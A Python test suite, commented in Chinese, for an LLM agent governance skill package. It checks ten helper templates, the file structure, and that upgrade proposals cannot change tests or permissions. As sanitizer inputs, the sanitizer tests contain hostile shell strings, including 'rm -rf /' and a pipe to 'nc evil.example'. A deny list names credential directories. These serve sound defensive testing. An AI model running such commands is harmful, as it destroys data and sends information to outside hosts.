#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""test-method-patterns.py — micro 档 LLM Agent 治理技能包自检测试（四类断言）。

A. 行为测试     —— 从 references/method-patterns.md 第 3 节（Shared Code Templates）
                   提取 ```python 代码块，exec 到独立命名空间后调用测试。
                   这是对权威源文件的测试，不是内联副本（防止契约/代码/测试三者脱节）。
B. 源文件完整性 —— 权威源存在、10 个 def 齐全、[PHONE] 在源中、templates.md 不得存在。
C. 结构一致性   —— 职能块守恒（micro=18）、升级四件套、13 个治理文件、prompts 约束、
                   language_policy、SKILL.md 索引化。
D. 不可变边界   —— 升级提案包不得修改 tests/、不得变更 permissions 块。

运行方式：python tests/test-method-patterns.py   （退出码正确传递：全绿 = 0）
仅依赖标准库。时间一律使用 datetime.now(timezone.utc)（utcnow 已弃用）。
"""

import json
import os
import re
import subprocess
import sys
import tempfile
import time
import unittest
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

# ─────────────────────────────────────────────────────────────────────────────
# 包参数（micro 档）。SKILL_DIR 由测试文件位置相对推导，禁止硬编码绝对路径。
# ─────────────────────────────────────────────────────────────────────────────
SKILL_DIR = Path(__file__).resolve().parent.parent
WORKSPACE_ROOT = SKILL_DIR.parent  # {WORKSPACE_ROOT} 占位符对应的实际根

SCALE_TIER = "micro"
SKILL_VERSION = "1.0.0"

AUTHORITATIVE_SOURCE = "references/method-patterns.md"  # ★ 唯一权威源
LEGACY_TEMPLATES_FILE = "references/templates.md"       # R3-2 已取消，不得存在

# 3.1–3.10 顺序固定，不得重排
TEN_TEMPLATE_NAMES = [
    "validate_input_schema",
    "sanitize_user_query",
    "execute_safe_command",
    "format_output_json",
    "retry_with_backoff",
    "read_reference_file",
    "generate_trace_id",
    "check_rate_limit",
    "mask_sensitive_data",
    "build_prompt_from_template",
]

# 职能块守恒（README-FOR-AI.md §10.1）：XS/S/M/L = 18，G = 36
EXPECTED_FB_BY_TIER = {"micro": 18, "small": 18, "medium": 18, "large": 18, "group": 36}
EXPECTED_FB_TOTAL = EXPECTED_FB_BY_TIER[SCALE_TIER]
# micro（XS）档各部门职能块数
EXPECTED_DEPARTMENT_BLOCKS = {
    "governance-and-delivery.md": 8,
    "engineering-and-safety.md": 10,
}

# 13 个治理与社区文件（R3-7，审核后 12→13），大小写须与规格一致
GOVERNANCE_FILES = [
    ".editorconfig", ".gitignore", "AGENTS.md", "CHANGELOG.md", "CODE_OF_CONDUCT.md",
    "CONTRIBUTING.md", "LICENSE", "README.en.md", "README.md", "README.zh.md",
    "SECURITY.md", "SKILL.md", "_meta.json",
]

# README-FOR-AI.md §9.1 权限声明（逐字符照抄，自我升级也不得改动）——D 类断言的基线
BASELINE_PERMISSIONS = [
    "files:",
    'read: ["{WORKSPACE_ROOT}/**", "{SKILL_DIR}/**"]',
    'write: ["{WORKSPACE_ROOT}/**"]',
    'deny: ["~/.ssh/**", "~/.aws/**", "~/.config/**", "/etc/**", "{WINDOWS_DIR}/**"]',
    "network: []",
    "commands: []",
    "mcp: [sessions_send, subagents]",
]

FB_HEADING_RE = re.compile(r"(?m)^## FB-\d+:")
PYTHON_BLOCK_RE = re.compile(r"```python[ \t]*\r?\n(.*?)```", re.DOTALL)
HEADING_RE = re.compile(r"^(#{1,6})\s*(.*)$")


# ─────────────────────────────────────────────────────────────────────────────
# 工具函数（仅标准库）
# ─────────────────────────────────────────────────────────────────────────────
def parse_frontmatter(path):
    """按行解析 YAML frontmatter（两个 '---' 之间），支持一层嵌套 dict。

    不引入外部依赖；值去除首尾引号。够用于 language_policy / metadata 断言。
    """
    text = Path(path).read_text(encoding="utf-8")
    lines = text.splitlines()
    if not lines or lines[0].strip() != "---":
        return {}
    fm = {}
    current_top = None
    in_fm = False
    for line in lines[1:]:
        stripped = line.strip()
        if stripped == "---":
            break
        if not in_fm:
            in_fm = True
        if not stripped or stripped.startswith("#"):
            continue
        if re.match(r"^\s", line):  # 嵌套键（一层）
            m = re.match(r"^\s+([A-Za-z0-9_.-]+)\s*:\s*(.*)$", line)
            if m and current_top is not None:
                key, value = m.group(1), m.group(2).strip().strip('"').strip("'")
                fm.setdefault(current_top, {})
                if isinstance(fm[current_top], dict):
                    fm[current_top][key] = value
            continue
        m = re.match(r"^([A-Za-z0-9_.-]+)\s*:\s*(.*)$", line)
        if not m:
            continue
        key, value = m.group(1), m.group(2).strip()
        if value == "":
            fm[key] = {}
            current_top = key
        else:
            fm[key] = value.strip('"').strip("'")
            current_top = None
    return fm


def extract_permissions_block(path):
    """提取 SKILL.md 中 permissions: 块（到下一个顶级键为止），返回逐行 strip 后的列表。"""
    text = Path(path).read_text(encoding="utf-8")
    lines = text.splitlines()
    block = []
    in_block = False
    for line in lines:
        if re.match(r"^permissions:\s*(\{.*\})?\s*$", line):
            inline = re.match(r"^permissions:\s*(\{.*\})\s*$", line)
            if inline:
                return [inline.group(1)]
            in_block = True
            continue
        if not in_block:
            continue
        if line.strip() == "":
            continue
        if re.match(r"^\S", line):  # 下一个顶级键（含结尾 '---'）
            break
        block.append(line.strip())
    return block


def _stdout_of(result):
    """尽力从常见返回约定（str / dict / tuple / CompletedProcess）提取 stdout 文本。"""
    if result is None:
        return ""
    if isinstance(result, bytes):
        return result.decode("utf-8", "replace")
    if isinstance(result, str):
        return result
    if isinstance(result, dict):
        for key in ("stdout", "output", "out", "result", "stdout_text"):
            value = result.get(key)
            if isinstance(value, bytes):
                return value.decode("utf-8", "replace")
            if isinstance(value, str):
                return value
        return json.dumps(result, ensure_ascii=False, default=str)
    if isinstance(result, tuple):
        for item in result:
            if isinstance(item, bytes) and item:
                return item.decode("utf-8", "replace")
            if isinstance(item, str) and item:
                return item
        return ""
    out = getattr(result, "stdout", None)
    if isinstance(out, bytes):
        return out.decode("utf-8", "replace")
    if isinstance(out, str):
        return out
    return str(result)


def load_template_namespace():
    """提取 method-patterns.md 第 3 节（Shared Code Templates）的 ```python 代码块，
    exec 到独立命名空间并返回。这是对源文件的测试，不是内联副本。
    """
    src = SKILL_DIR / AUTHORITATIVE_SOURCE
    text = src.read_text(encoding="utf-8")
    lines = text.splitlines()

    # 收集标题（跳过围栏代码块内部——# 注释行不是标题）
    headings = []  # (行号, 级别, 标题)
    in_fence = False
    for i, line in enumerate(lines):
        if line.lstrip().startswith("```"):
            in_fence = not in_fence
            continue
        if in_fence:
            continue
        m = HEADING_RE.match(line)
        if m:
            headings.append((i, len(m.group(1)), m.group(2).strip()))

    # 定位第 3 节标题（优先编号形 "## 3. Shared Code Templates"，
    # 避免匹配到含相同短语的文档大标题）
    candidates = [(i, lvl) for i, lvl, title in headings
                  if re.match(r"^3[\.\s、:：]", title)]
    if not candidates:
        candidates = [(i, lvl) for i, lvl, title in headings
                      if "shared code templates" in title.lower() and lvl >= 2]
    if not candidates:
        raise AssertionError(
            f"{AUTHORITATIVE_SOURCE} 未找到第 3 节（Shared Code Templates）标题"
        )
    start_idx, level = min(candidates, key=lambda c: (c[1], c[0]))

    # 节边界：下一个同级或更高级标题（同样跳过代码块内部）
    end_idx = len(lines)
    for i, lvl, _title in headings:
        if i > start_idx and lvl <= level:
            end_idx = i
            break

    section = "\n".join(lines[start_idx:end_idx])
    blocks = PYTHON_BLOCK_RE.findall(section)
    if not blocks:
        raise AssertionError(
            f"{AUTHORITATIVE_SOURCE} 第 3 节未包含任何 ```python 代码块"
        )

    ns = {"__name__": "method_patterns_source", "__file__": str(src)}
    for mod in ("re", "json", "time", "os", "sys", "subprocess", "uuid", "hashlib",
                "random", "string", "collections", "functools", "math", "tempfile",
                "shutil", "typing"):
        try:
            ns[mod] = __import__(mod)
        except ImportError:
            pass
    ns["datetime"] = datetime
    ns["timezone"] = timezone
    ns["Path"] = Path
    for block in blocks:
        try:
            exec(compile(block, str(src), "exec"), ns)
        except SyntaxError as exc:
            offending = ""
            if exc.lineno and 0 < exc.lineno <= len(block.splitlines()):
                offending = block.splitlines()[exc.lineno - 1].strip()
            raise AssertionError(
                f"{AUTHORITATIVE_SOURCE} 第 3 节代码块存在语法错误"
                f"（块内第 {exc.lineno} 行: {exc.msg}; {offending}）"
                f"——权威源缺陷，须修复 method-patterns.md"
            ) from exc
    return ns


# ═════════════════════════════════════════════════════════════════════════════
# A. 行为测试（每个模板至少 1 条：正常路径 + 边界）
# ═════════════════════════════════════════════════════════════════════════════
class BehaviorTests(unittest.TestCase):
    """对权威源中 10 个模板的实际行为测试（exec 源代码后调用）。"""

    @classmethod
    def setUpClass(cls):
        # ★ E22：显式固定沙箱根，消除对 CWD 的隐式依赖。
        # method-patterns.md 模块级以 SKILL_ROOT = os.environ.get("SKILL_DIR", ".")
        # / WORKSPACE_ROOT = os.environ.get("WORKSPACE_ROOT", ".") 读取根路径，
        # 缺省回退 "."（即当前工作目录）——故加载命名空间前必须先设定环境变量。
        os.environ.setdefault("SKILL_DIR", str(SKILL_DIR))
        os.environ.setdefault("WORKSPACE_ROOT", str(WORKSPACE_ROOT))
        cls.ns = load_template_namespace()
        missing = [n for n in TEN_TEMPLATE_NAMES if not callable(cls.ns.get(n))]
        if missing:
            raise AssertionError(
                f"{AUTHORITATIVE_SOURCE} 第 3 节缺少模板实现: {missing}"
            )

    def _fn(self, name):
        fn = self.ns.get(name)
        self.assertTrue(callable(fn), f"模板 {name} 不可调用")
        return fn

    # ── 1. validate_input_schema：合法输入通过 / 非法输入拒绝 ──────────────────
    def test_validate_input_schema(self):
        fn = self._fn("validate_input_schema")
        # 自适应探测实现所讲的 schema 方言，再在该方言下断言 通过/拒绝
        dialects = [
            ({"name": {"type": str, "required": True},
              "age": {"type": int, "required": False}},
             {"name": 12345, "age": "twenty"}),
            ({"name": {"type": str}, "age": {"type": int}},
             {"name": 12345, "age": "twenty"}),
            ({"name": {"type": "string"}, "age": {"type": "integer"}},
             {"name": 12345, "age": "twenty"}),
            ({"name": {"type": "str"}, "age": {"type": "int"}},
             {"name": 12345, "age": "twenty"}),
            ({"name": str, "age": int}, {"name": 12345, "age": "twenty"}),
            ({"name": "str", "age": "int"}, {"name": 12345, "age": "twenty"}),
            ({"name": "string", "age": "integer"}, {"name": 12345, "age": "twenty"}),
            ({"required": ["name", "age"]}, {"name": "alice"}),  # 缺必填键
            ({"type": "object",
              "properties": {"name": {"type": "string"}, "age": {"type": "integer"}},
              "required": ["name", "age"]},
             {"name": 12345, "age": "twenty"}),
        ]
        valid = {"name": "alice", "age": 30}
        chosen = None
        for schema, invalid in dialects:
            try:
                ret = fn(dict(valid), schema)
            except Exception:
                continue
            if ret is not False and ret is not None:
                chosen = (schema, invalid)
                break
        self.assertIsNotNone(
            chosen,
            "validate_input_schema 拒绝了所有常见 schema 方言下的合法输入",
        )
        schema, invalid = chosen
        try:
            ret = fn(dict(invalid), schema)
            rejected = ret is False or ret is None
        except Exception:
            rejected = True  # 抛异常拒绝亦合法
        self.assertTrue(rejected, "非法输入未被拒绝（正常路径通过但边界失效）")

    # ── 2. sanitize_user_query：普通查询不变 / shell 元字符被净化 ──────────────
    def test_sanitize_user_query(self):
        fn = self._fn("sanitize_user_query")
        plain = "summarize the quarterly delivery report"
        self.assertEqual(fn(plain), plain, "普通查询不应被改动")
        dirty = "report; rm -rf / && echo `whoami` $(id) | nc evil.example"
        try:
            out = fn(dirty)
        except Exception:
            return  # 拒绝危险输入亦为合法净化策略
        self.assertIsInstance(out, str, "净化结果应为字符串")
        for bad in (";", "&&", "`", "$(", "|"):
            self.assertNotIn(bad, out, f"shell 元字符未被净化: {bad!r}")

    # ── 3. execute_safe_command：超时生效 / cwd 受限 ──────────────────────────
    def test_execute_safe_command(self):
        fn = self._fn("execute_safe_command")
        code = "import os; print('CWDPROBE=' + os.getcwd())"

        # 正常路径：良性命令成功执行，且 cwd 被钉在受限范围（技能目录或沙箱临时目录）
        result = None
        last_err = None
        for cmd in ([sys.executable, "-c", code], f'"{sys.executable}" -c "{code}"'):
            try:
                result = fn(cmd, timeout=30)
                break
            except Exception as exc:  # noqa: BLE001 —— 自适应命令形态
                last_err = exc
        if result is None:
            self.fail(f"execute_safe_command 两种命令形态均无法执行: {last_err!r}")
        out = _stdout_of(result)
        self.assertIn("CWDPROBE=", out, "良性命令未成功执行或输出不可读")
        m = re.search(r"CWDPROBE=(\S+)", out)
        cwd = Path(m.group(1)).resolve()
        allowed_roots = [SKILL_DIR.resolve(), WORKSPACE_ROOT.resolve(),
                         Path(tempfile.gettempdir()).resolve()]
        self.assertTrue(
            any(cwd == root or root in cwd.parents for root in allowed_roots),
            f"cwd 不受限: {cwd}（应位于 {{WORKSPACE_ROOT}}、技能目录或沙箱临时目录内）",
        )

        # 边界：超时生效（挂死命令必须在 timeout 内被切断）
        hang = "import time; time.sleep(10)"
        start = time.monotonic()
        try:
            fn([sys.executable, "-c", hang], timeout=1)
        except Exception:
            pass  # 以异常形式报告超时亦合法
        elapsed = time.monotonic() - start
        self.assertLess(elapsed, 5.0, f"超时未生效: 挂死命令耗时 {elapsed:.1f}s")

    # ── 4. format_output_json：含 AIGC 标签与时间戳 ──────────────────────────
    def test_format_output_json(self):
        fn = self._fn("format_output_json")
        now = datetime.now(timezone.utc)
        res = fn("Quarterly summary content", "test-provider")
        if isinstance(res, bytes):
            res = res.decode("utf-8", "replace")
        if isinstance(res, dict):
            data, text = res, json.dumps(res, ensure_ascii=False, default=str)
        elif isinstance(res, str):
            text = res
            try:
                data = json.loads(res)
            except ValueError:
                brace = re.search(r"\{.*\}", res, re.DOTALL)
                try:
                    data = json.loads(brace.group(0)) if brace else None
                except ValueError:
                    data = None
        else:
            data, text = None, str(res)
        # 标准 JSON（结构化或可解析的 JSON 字符串）
        self.assertIsInstance(data, dict, "输出必须是合法 JSON 对象")
        # AIGC 标签（显式声明或元数据字段）
        self.assertRegex(
            text, r"(?i)ai[-_ ]?generated",
            "输出缺少 AIGC 标签",
        )
        if isinstance(data, dict):
            self.assertIs(data.get("ai_generated"), True,
                          "结构化输出应含 ai_generated: true 元数据")
            ts = data.get("generated_at") or data.get("timestamp") or data.get("created_at")
            if isinstance(ts, str):
                self.assertRegex(ts, r"\d{4}-\d{2}-\d{2}", "时间戳格式应为 ISO8601")
        else:
            self.assertRegex(text, r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}",
                             "输出缺少时间戳")
        self.assertIn("Quarterly summary content", text, "内容本体丢失")
        self.assertIn("test-provider", text, "provider 信息丢失")
        # 时间戳不得超前于当前时刻（以 UTC 为基准）
        ts_match = re.search(r"(\d{4}-\d{2}-\d{2})[T ](\d{2}:\d{2})", text)
        if ts_match:
            try:
                stamp = datetime.strptime(
                    f"{ts_match.group(1)} {ts_match.group(2)}", "%Y-%m-%d %H:%M"
                ).replace(tzinfo=timezone.utc)
                self.assertLessEqual(
                    stamp, now + timedelta(minutes=5),
                    "时间戳超前于当前 UTC 时间",
                )
            except ValueError:
                pass
        # 边界：非 ASCII 内容不崩溃
        out2 = fn("中文摘要内容", "test-provider")
        self.assertIn("中文摘要内容", _stdout_of(out2) if not isinstance(out2, (str, dict)) else (
            out2 if isinstance(out2, str) else json.dumps(out2, ensure_ascii=False, default=str)
        ))

    # ── 5. retry_with_backoff：首次失败后重试成功 / 达上限后抛出 ──────────────
    def test_retry_with_backoff_success_after_transient_failure(self):
        fn = self._fn("retry_with_backoff")
        last_err = None
        for exc_type in (ValueError, ConnectionError, TimeoutError, RuntimeError):
            calls = {"n": 0}

            def flaky(_exc=exc_type, _calls=calls):
                _calls["n"] += 1
                if _calls["n"] == 1:
                    raise _exc("transient failure")
                return "recovered"

            try:
                ret = fn(flaky, max_retries=3)
            except Exception as exc:  # noqa: BLE001
                last_err = exc
                continue
            self.assertEqual(ret, "recovered", "重试成功后应返回函数结果")
            self.assertGreaterEqual(calls["n"], 2, "首次失败后未发生重试")
            return
        self.fail(
            f"首次失败后重试未成功（各异常类型均直接抛出，最后: {last_err!r}）"
        )

    def test_retry_with_backoff_raises_after_limit(self):
        fn = self._fn("retry_with_backoff")
        for exc_type in (ValueError, ConnectionError, TimeoutError, RuntimeError):
            calls = {"n": 0}

            def boom(_exc=exc_type, _calls=calls):
                _calls["n"] += 1
                raise _exc("permanent failure")

            try:
                fn(boom, max_retries=2)
            except Exception:
                if calls["n"] >= 2:
                    self.assertLessEqual(calls["n"], 3, "重试次数超出上限")
                    return
                continue  # 该异常类型未被重试，换类型再试
            if calls["n"] >= 2:
                self.fail("达到重试上限后应抛出异常，而非静默返回")
                return
            continue
        self.fail("未观察到「重试后仍失败则抛出」的行为")

    # ── 6. read_reference_file：允许路径可读 / 越界路径拒绝 ───────────────────
    def test_read_reference_file(self):
        fn = self._fn("read_reference_file")

        # 正常路径：只读断言——直接读取包内已存在的真实文件（不写任何探针，
        # 中断不会残留文件污染包树），且内容须与直读结果逐字符一致
        candidates = ["references/error-codes.md", "references/scaling.md",
                      "references/method-patterns.md"]
        existing = [c for c in candidates if (SKILL_DIR / c).is_file()]
        self.assertTrue(existing, "references/ 下缺少可用于只读断言的真实文件")
        read_ok = False
        for rel in existing:
            expected = (SKILL_DIR / rel).read_text(encoding="utf-8")
            try:
                out = fn(rel)
            except Exception:
                continue
            if isinstance(out, str) and out == expected:
                read_ok = True
                break
        self.assertTrue(read_ok, "允许路径（references/ 内真实文件）应可读且内容一致")

        # 边界：越界路径拒绝（包外相对路径 / 绝对路径，均为只读探测，无需落盘）
        outside_real = WORKSPACE_ROOT / "README-FOR-AI.md"
        secret_head = ""
        if outside_real.is_file():
            secret_head = outside_real.read_text(encoding="utf-8")[:200]
        temp_outside = Path(tempfile.gettempdir()).resolve() / "oob-probe.md"
        rel_outside = os.path.relpath(temp_outside, SKILL_DIR)
        probes = ["../outside.md", str(temp_outside),
                  rel_outside, rel_outside.replace("\\", "/")]
        if outside_real.is_file():
            probes.append(os.path.relpath(outside_real, SKILL_DIR).replace("\\", "/"))
        rejected = True
        for p in probes:
            try:
                out = fn(p)
            except Exception:
                continue  # 抛异常拒绝
            if isinstance(out, str) and secret_head and secret_head in out:
                rejected = False  # 返回了越界文件内容（泄露）
                break
        self.assertTrue(rejected, "越界路径必须被拒绝且不得泄露内容")

    # ── 7. generate_trace_id：默认前缀 / 自定义前缀 / 唯一性 ──────────────────
    def test_generate_trace_id(self):
        fn = self._fn("generate_trace_id")
        default = fn()
        self.assertIsInstance(default, str, "trace id 应为字符串")
        self.assertTrue(default.lower().startswith("trace"),
                        "默认前缀应为 trace")
        custom = fn(prefix="req")
        self.assertTrue(custom.lower().startswith("req"),
                        "自定义前缀应生效")
        self.assertNotEqual(default, custom)
        ids = {fn() for _ in range(50)}
        self.assertEqual(len(ids), 50, "trace id 必须唯一（50 次调用出现重复）")

    # ── 8. check_rate_limit：窗口内通过 / 超限拒绝 ────────────────────────────
    def test_check_rate_limit(self):
        fn = self._fn("check_rate_limit")

        def allowed(identifier, limit, window):
            try:
                ret = fn(identifier, limit=limit, window=window)
            except Exception:
                return False  # 超限抛异常亦为拒绝
            return ret is not False and ret is not None

        ident = "test-rate-" + uuid.uuid4().hex
        for _ in range(3):
            self.assertTrue(allowed(ident, 3, 60), "窗口内（未超 limit）应通过")
        self.assertFalse(allowed(ident, 3, 60), "超过 limit 后应被拒绝")

    # ── 9. mask_sensitive_data：email / IP / phone 三类均脱敏 ──────────────────
    def test_mask_sensitive_data(self):
        fn = self._fn("mask_sensitive_data")
        text = ("Contact john.doe@example.com from 192.168.1.100 "
                "or call 13812345678 today")
        out = fn(text)
        self.assertIsInstance(out, str)
        cases = [
            ("john.doe@example.com", "[EMAIL]"),
            ("192.168.1.100", "[IP]"),
            ("13812345678", "[PHONE]"),
        ]
        for raw, label in cases:
            self.assertNotIn(raw, out, f"敏感数据未脱敏: {raw}")
            self.assertIn(label, out, f"缺少脱敏占位符: {label}")
        # 边界：无 PII 的文本保持不变
        clean = "No sensitive data here, ticket 12345."
        self.assertEqual(fn(clean), clean, "无 PII 文本不应被改动")

    # ── 10. build_prompt_from_template：模板填充 / 输入被净化 ─────────────────
    def test_build_prompt_from_template(self):
        fn = self._fn("build_prompt_from_template")
        tmpl = None
        for candidate in (
            "Summarize the following topic: {topic}",
            "Summarize the following topic: {{topic}}",
            "Summarize the following topic: $topic",
            "Summarize the following topic: <topic>",
        ):
            try:
                out = fn(candidate, topic="AI governance")
            except Exception:
                continue
            if isinstance(out, str) and "AI governance" in out:
                tmpl = candidate
                break
        self.assertIsNotNone(tmpl, "模板填充失败：常见占位符语法均未生效")
        # 边界：kwargs 输入先净化（拒绝或去除元字符均可）
        try:
            out2 = fn(tmpl, topic="safe; rm -rf / `whoami`")
        except Exception:
            return  # 拒绝危险输入亦为合法净化策略
        self.assertIsInstance(out2, str)
        for bad in (";", "`"):
            self.assertNotIn(bad, out2, f"kwargs 输入未被净化: {bad!r}")


# ═════════════════════════════════════════════════════════════════════════════
# B. 源文件完整性测试（关键：防契约/代码/测试三者脱节）
# ═════════════════════════════════════════════════════════════════════════════
class SourceIntegrityTests(unittest.TestCase):
    """断言权威模板源存在且完整——测试测的是源文件，不是内联副本。"""

    def test_templates_source_exists(self):
        """断言权威模板文件存在且含全部 10 个函数定义"""
        src = SKILL_DIR / AUTHORITATIVE_SOURCE
        self.assertTrue(src.exists(), f"模板权威源缺失: {src}")
        content = src.read_text(encoding="utf-8")
        for fn_name in TEN_TEMPLATE_NAMES:
            self.assertIn(f"def {fn_name}", content,
                          f"模板 {fn_name} 在权威源中缺失")

    def test_phone_masking_in_source(self):
        """断言权威源含 PHONE 实现——防止契约/代码/测试三者脱节"""
        src = SKILL_DIR / AUTHORITATIVE_SOURCE
        self.assertTrue(src.exists(), f"模板权威源缺失: {src}")
        content = src.read_text(encoding="utf-8")
        self.assertIn("[PHONE]", content, "权威源缺失 PHONE 脱敏实现")

    def test_legacy_templates_file_absent(self):
        """★ R3 新增：断言已取消的 templates.md 不存在，防止双权威源"""
        legacy = SKILL_DIR / LEGACY_TEMPLATES_FILE
        self.assertFalse(legacy.exists(), "templates.md 已取消（R3-2），不得生成")


# ═════════════════════════════════════════════════════════════════════════════
# C. 结构一致性测试
# ═════════════════════════════════════════════════════════════════════════════
class StructureTests(unittest.TestCase):
    """micro 档结构不变量：职能块守恒、升级四件套、治理文件、prompts 约束。"""

    def test_function_block_conservation(self):
        """断言职能块总数守恒：micro/small/medium/large=18，group=36"""
        dept_dir = SKILL_DIR / "references" / "departments"
        self.assertTrue(dept_dir.exists(), f"部门目录缺失: {dept_dir}")
        actual = {}
        total = 0
        for f in sorted(dept_dir.glob("*.md")):
            content = f.read_text(encoding="utf-8")
            n = len(FB_HEADING_RE.findall(content))
            actual[f.name] = n
            total += n
        self.assertEqual(
            total, EXPECTED_FB_TOTAL,
            f"{SCALE_TIER} 档职能块总数应为 {EXPECTED_FB_TOTAL}，实际 {total}（合并档位丢失职能）",
        )
        self.assertEqual(
            actual, EXPECTED_DEPARTMENT_BLOCKS,
            f"各部门职能块数与 {SCALE_TIER} 档规格不符: {actual}",
        )

    def test_scaling_files_present(self):
        """断言自我升级四件套齐全且 policy 为 propose-only"""
        for p in ["references/scaling.md", ".scaling-state.json",
                  "scripts/self-scale.ps1", "scripts/scaling-config.json"]:
            self.assertTrue((SKILL_DIR / p).exists(), f"升级机制缺失: {p}")
        cfg = json.loads(
            (SKILL_DIR / "scripts" / "scaling-config.json").read_text(encoding="utf-8")
        )
        self.assertEqual(cfg.get("upgrade_policy"), "propose-only",
                         "upgrade_policy 只能为 propose-only（P36）")

    def test_governance_files_present(self):
        """★ R3-7（12→13）：断言 13 个治理与社区文件全档位齐备，文件名逐字符一致"""
        actual_names = {f.name for f in SKILL_DIR.iterdir()}
        for name in GOVERNANCE_FILES:
            p = SKILL_DIR / name
            self.assertTrue(p.exists(), f"治理文件缺失: {name}")
            self.assertTrue(p.is_file(), f"治理文件不是普通文件: {name}")
            self.assertIn(name, actual_names,
                          f"文件名大小写须与规格一致: {name}")

    def test_no_filename_with_space(self):
        """★ R3-7：断言无文件名含空格（防 'CODE OF CONDUCT.md'）"""
        for f in SKILL_DIR.rglob("*"):
            self.assertNotIn(" ", f.name, f"文件名含空格: {f}")

    def test_prompt_modes_declared(self):
        """★ R3-3：断言每个 prompt 声明 mode，且 01/02 为 human-paste"""
        prompts = sorted((SKILL_DIR / "prompts").glob("*.md"))
        self.assertTrue(prompts, "prompts/ 目录为空或缺目录")
        for f in prompts:
            head = f.read_text(encoding="utf-8")[:400]
            self.assertRegex(head, r"mode:\s*(human-paste|agent-invoked)",
                             f"{f.name} 未声明 mode")
        for n in ["01-implement-method.md", "02-robustness-checks.md"]:
            head = (SKILL_DIR / "prompts" / n).read_text(encoding="utf-8")[:400]
            self.assertIn("mode: human-paste", head, f"{n} 必须为 human-paste")

    def test_human_paste_prompts_self_contained(self):
        """★ R3-3：断言 human-paste prompt 不含内部路径与写死语言（H1/H2/H6）"""
        for f in (SKILL_DIR / "prompts").glob("*.md"):
            content = f.read_text(encoding="utf-8")
            if "mode: human-paste" not in content[:400]:
                continue
            for bad in ["references/", "{SKILL_DIR}", "SKILL.md", "All content in English"]:
                self.assertNotIn(bad, content, f"{f.name} 违反自包含约束: {bad}")

    def test_language_policy_declared(self):
        """★ R3-4：断言 frontmatter 含 language_policy 且取值正确（四字段）"""
        skill_md = SKILL_DIR / "SKILL.md"
        self.assertTrue(skill_md.exists(), "SKILL.md 缺失")
        fm = parse_frontmatter(skill_md)
        lp = fm.get("language_policy")
        self.assertIsInstance(lp, dict, "frontmatter 缺少 language_policy 块")
        self.assertEqual(str(lp.get("authoring")), "en")
        self.assertEqual(str(lp.get("encoding")), "utf-8")
        self.assertEqual(str(lp.get("output")), "user-specified")
        self.assertEqual(str(lp.get("fallback")), "en")

    def test_skill_md_is_index_only(self):
        """★ R3-1：断言 SKILL.md 正文 ≤120 行且不含代码实现与完整错误码表"""
        skill_md = SKILL_DIR / "SKILL.md"
        self.assertTrue(skill_md.exists(), "SKILL.md 缺失")
        text = skill_md.read_text(encoding="utf-8")
        parts = text.split("---", 2)
        self.assertGreaterEqual(len(parts), 3, "SKILL.md 缺少 frontmatter")
        body = parts[2]
        self.assertLessEqual(len(body.splitlines()), 120, "SKILL.md 正文超 120 行")
        self.assertFalse(re.search(r"(?m)^def ", body),
                         "SKILL.md 不得含代码实现")
        self.assertFalse(re.search(r"\| *[A-Z]{2,5}_\d{3}", body),
                         "SKILL.md 不得含具体错误码表")

    def test_metadata_consistency(self):
        """断言 frontmatter 元数据与 micro 档参数一致（版本 1.0.0、档位、部门数、职能块数）"""
        skill_md = SKILL_DIR / "SKILL.md"
        self.assertTrue(skill_md.exists(), "SKILL.md 缺失")
        fm = parse_frontmatter(skill_md)
        self.assertEqual(str(fm.get("version")), SKILL_VERSION,
                         f"版本号应为 {SKILL_VERSION}")
        metadata = fm.get("metadata")
        self.assertIsInstance(metadata, dict, "frontmatter 缺少 metadata 块")
        self.assertEqual(str(metadata.get("scale_tier")), SCALE_TIER)
        self.assertEqual(str(metadata.get("department_count")),
                         str(len(EXPECTED_DEPARTMENT_BLOCKS)))
        self.assertEqual(str(metadata.get("function_block_count")),
                         str(EXPECTED_FB_TOTAL))


# ═════════════════════════════════════════════════════════════════════════════
# D. 不可变边界测试（升级安全的关键）
# ═════════════════════════════════════════════════════════════════════════════
class ImmutableBoundaryTests(unittest.TestCase):
    """升级提案包不得自我豁免（改 tests/）或自我提权（改 permissions）。"""

    def test_upgrade_package_excludes_immutable(self):
        """扫描 {WORKSPACE_ROOT}/.skill-upgrade/ 下所有提案包，
        断言其中不含 tests/ 变更、不含 permissions 块变更"""
        upgrade_root = WORKSPACE_ROOT / ".skill-upgrade"
        if not upgrade_root.exists():
            self.skipTest(f"暂无升级提案包（{upgrade_root} 不存在）")
        packages = [p for p in sorted(upgrade_root.iterdir()) if p.is_dir()]
        if not packages:
            self.skipTest(".skill-upgrade/ 下无提案包目录")
        for pkg in packages:
            files = [f.relative_to(pkg).as_posix() for f in pkg.rglob("*")]
            self.assertFalse(
                any(f == "tests" or f.startswith("tests/") for f in files),
                f"升级包试图修改测试（自我豁免）: {pkg}",
            )
            skill_md = pkg / "SKILL.md"
            if skill_md.exists():
                new_perm = extract_permissions_block(skill_md)
                self.assertEqual(
                    new_perm, BASELINE_PERMISSIONS,
                    f"升级包试图修改权限（自我提权）: {pkg}",
                )


if __name__ == "__main__":
    unittest.main(verbosity=2)
